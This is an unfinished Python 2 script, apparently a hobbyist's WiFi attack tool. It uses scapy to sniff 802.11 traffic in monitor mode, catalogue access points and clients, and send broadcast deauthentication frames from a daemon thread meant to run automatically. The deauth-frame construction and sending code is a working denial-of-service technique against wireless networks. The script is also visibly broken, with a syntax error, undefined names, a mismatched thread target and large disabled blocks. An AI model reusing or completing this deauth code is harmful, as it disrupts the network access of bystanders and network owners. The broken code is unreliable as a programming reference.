#! /usr/bin/env python
import threading
from scapy.all import *
from Queue import Queue, Empty
from time import sleep
from wifi_packetidentifier import pidentifier
import re
"""
lekture:
https://gist.github.com/garyconstable/1dca3c32dfd05f0bd15f  for optimal use of scapy / maybe del
https://www.digitalocean.com/community/tutorials/how-to-use-args-and-kwargs-in-python-3
https://www.python-kurs.eu/python3_dekorateure.php  # *args **kwargs
http://effbot.org/zone/thread-synchronization.htm  # threading nice explain
Infos:

"""

"""declaring global vals"""
sniff_iface="wlan1mon"
targets_count = 0
targets = []
casters = []
casters_count = 0
deauth_counter = 5  # set number of deauths to send after new AP
"""declaring globals end"""

class senddeauth(object):  # not tested
	"""class send_deauth"""
	def __init__(self, mac="ff:ff:ff:ff:ff:ff"):  # constuctor inits mac @ broadcast
		self.mac = mac			      # set object mac
		self.pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.mac ,addr3=self.mac)/Dot11Deauth()
	def send_deauth(self):
		sendp(self.pkt, iface=sniff_iface, count=deauth_counter, inter=.2, verbose=0)
	def chilled_send_deauth(self):
		while True:
			#sendp(self.pkt, iface=sniff_iface, count=deauth_counter, inter=.2, verbose=0)
			sleep(5)
	"""still under construction - end of class"""
class caster(object):  # dont know in beginning
	def __init__(self, mac, data_dic={}):  
		self.data_dic=data_dic
		self.mac=mac
	def logger(self):
		print data_dic
		

				
			


class target(object): #very good idea object instead of ?D-list should be called APs
	"""each AP 1xtarget / Many x Clients"""
	def __init__(self, mac_ap,ssid,sigstren):  # args: arg_1/arg_2.... takes any numbers of arg_x
		self.ssid=ssid
		self.sigstren=sigstren
		#self.timestamp=timestamp  # not used atm
		self.cl_l=[]
		"""inits 2d list"""
		"""inits 2d list end"""
		self.mac_ap=mac_ap
		self.ssid=ssid
		#self.data_dic={"mac_ap":mac_ap,"ssid"} not rdy
	def cl_p_to_this(cl_mac, sigstren):
		pass
	def AP_found(self,bypkttype):
		print "AP -> Mac: "+self.mac_ap+" SSID: "+str(self.ssid)+" pkttype: "+str(bypkttype)
	def CL_found(self):
		print 'found a CL connected to '+self.mac_ap+' prints List now'
		print self.cl_l
	"""testfuncs end"""
	"""target class end"""

def check_formirrormode():
	pass

def read_dot11(p):  # filling target and Clients
	"""reads sigstrength from all packets(notdecoded) and writes AP object instances to global list"""
	 #gets signal strength from undecoded paketfield
	#if sigstrength<-80:	#cancle if sigstrength >-80
	#	return null 
	p_lu=pidentifier(p)  # creates instance of packetidentifier
	p_lu.multi_paket_reader()  # runs through the reader to get importend vals from packets
	global targets  # makes global writeable in this func
	global targets_count
	if p_lu.pktdic.get("name")=='beacon' or p_lu.pktdic.get("name")=='probres':  # checks for beacon and probres
		ap_regged=0  # check
		for obj in targets:  # iterate over instances of APlistobjects
			if obj.mac_ap==p_lu.pktdic.get("caster_mac"):  # checks if mac is already in an instance of the APlistobject
				ap_regged=1  # check
				break
		if ap_regged==0:  # check
			targets.append(target(p_lu.pktdic.get("caster_mac"),p_lu.pktdic.get("ssid"),
				p_lu.pktdic.get("sigstren")))  # ALL INSTANCES OF TARGET(APs) ARE IN targets now!!! can be found via target_counter
			targets[targets_count].AP_found(p_lu.pktdic.get("name"))  # test
			targets_count+=1  #global counter++
	#got beacon+Probres -> AP ez...
	elif p_lu.pktdic.get("name")!=None:
		global casters,casters_count
		caster_regged=0
		for obj in casters:
			if obj.mac==p_lu.pktdic.get("caster_mac"):  # checks if mac is already in an instance of the casters Obj
				caster_regged=1  # check
				break
		if caster_regged==0:
			casters.append(caster(p_lu.pktdic.get("caster_mac"),p_lu.pktdic))
			caster_counter
			casters[].logger








	""" cant understand....
	#HERE starts CL distinguish
	elif (p_lu.caster=='cl') or (p_lu.caster=='clandap'):  # checks for poss cl sended packet
		ap_regged=0
		c=0  # counter
		Iteration for all Packets sended to someone check if receiver is in targets
		for obj in targets:   iterate over instances of targ
			if obj.mac_ap==p_lu.receiver_mac:  # checks if mac is already in an instance of the APlistobject
				ap_regged=1  # check
				obj.cl_l.append(p_lu.caster_mac)
				obj.CL_found()
				break  # break iteration if found
			if(p_lu.pktname=='probreq') and (obj.ssid=='p_lu.ssid'):
				obj.poss_cl_l_probereq(p_lu.caster_mac,p_lu.ssid) # only catches REQs to known targets
			c+=1  # counts the instances +1 @end

		if ap_regged==1:  # check if ap is reggistered
			pass
	elif p_lu.reqorres=='res':
		pass
		##WORK TO DO  - Catch Res to identify AP is also in Range
	if(p_lu.pktname=='probreq'):
		print 'found'
			"""
			
	
	
def threadedsniffer():
	"""defines x-tra thread&starts it"""
	#q = Queue()  # needed when passing values back to mainthread
	sniffdaemon=threading.Thread(name='sniffd', target=threadedsnifftarget)  # defines thread
	sniffdaemon.setDaemon(True)  # set thread to daemon (just ends when mainthread ends)
	sniffdaemon.start()  # starts thread
	#while (not snifffin):   # needed when passing values back to mainthread
		#try:    # needed when passing values back to mainthread
			#pkt = q.get(timeout = 1)  # needed when passing values back to mainthread
				#testmainthreadfunction(pkt)  # needed when passing values back to mainthread
			
def threadedsnifftarget():
	sniff(iface=sniff_iface,prn=read_dot11,store=0)  # call sniff from second function to avoid
						
def threadedattack():
	attackthread=threading.Thread(name='attthr', target=threadedattacktarget)
	attackthread.start()

def threadedatttacktarget():
	pass

def threadtest():
	"""test for threading"""
	sleep(10) # sleep for ~X seconds
	print('test->right now ends mainthread after sleep cause demonized snifferthread') 


"""main starts here"""
#check_for_mirrormode()
threadedsniffer()  # start snifferthread to build up AP-objects
#threadedattack()  # start paralel thread to sniffer to attack found AP with requierments     NOT DONE
#
obj=senddeauth("ff:ff:ff:ff:ff:ff")
demondeauther=threading.Thread(name='autodeauth', target=obj.chilled_send_deauth)
demondeauther.setDaemon(True)
demondeauther.start()

demonthreadtest=threading.Thread(name='dtt', target=threadtest)
demonthreadtest.start()




